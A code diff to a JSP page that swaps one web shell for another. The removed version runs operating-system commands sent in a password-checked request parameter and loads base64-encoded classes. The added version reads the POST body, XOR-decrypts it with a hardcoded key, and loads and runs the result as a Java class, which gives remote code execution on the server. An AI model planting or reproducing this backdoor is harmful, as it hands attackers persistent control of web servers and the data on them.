@@ -1,27 +1,43 @@
-<% if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %><%!
-    class U extends ClassLoader {
-        U(ClassLoader c) {
-            super(c);
-        }
-        public Class g(byte[] b) {
-            return super.defineClass(b, 0, b.length);
-        }
-    }
- 
-    public byte[] base64Decode(String str) throws Exception {
-        try {
-            Class clazz = Class.forName("sun.misc.BASE64Decoder");
-            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
-        } catch (Exception e) {
-            Class clazz = Class.forName("java.util.Base64");
-            Object decoder = clazz.getMethod("getDecoder").invoke(null);
-            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
-        }
-    }
+<%!
+private byte[] Decrypt(byte[] data) throws Exception
+{
+     byte[] decodebs;
+        Class baseCls ;
+                try{
+                    baseCls=Class.forName("java.util.Base64");
+                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
+                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
+                }
+                catch (Throwable e)
+                {
+                    baseCls = Class.forName("sun.misc.BASE64Decoder");
+                    Object Decoder=baseCls.newInstance();
+                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});
+
+                }
+    String key="e45e329feb5d925b";
+	for (int i = 0; i < decodebs.length; i++) {
+		decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));
+	}
+	return decodebs;
+}
 %>
-<%
-    String cls = request.getParameter("passwd");
-    if (cls != null) {
-        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
-    }
+<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
+        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            byte[] buf = new byte[512];
+            int length=request.getInputStream().read(buf);
+            while (length>0)
+            {
+                byte[] data= Arrays.copyOfRange(buf,0,length);
+                bos.write(data);
+                length=request.getInputStream().read(buf);
+            }
+            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性
+            out.clear();
+            out=pageContext.pushBody();
+            */
+            out.clear();
+            out=pageContext.pushBody();
+        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
 %>
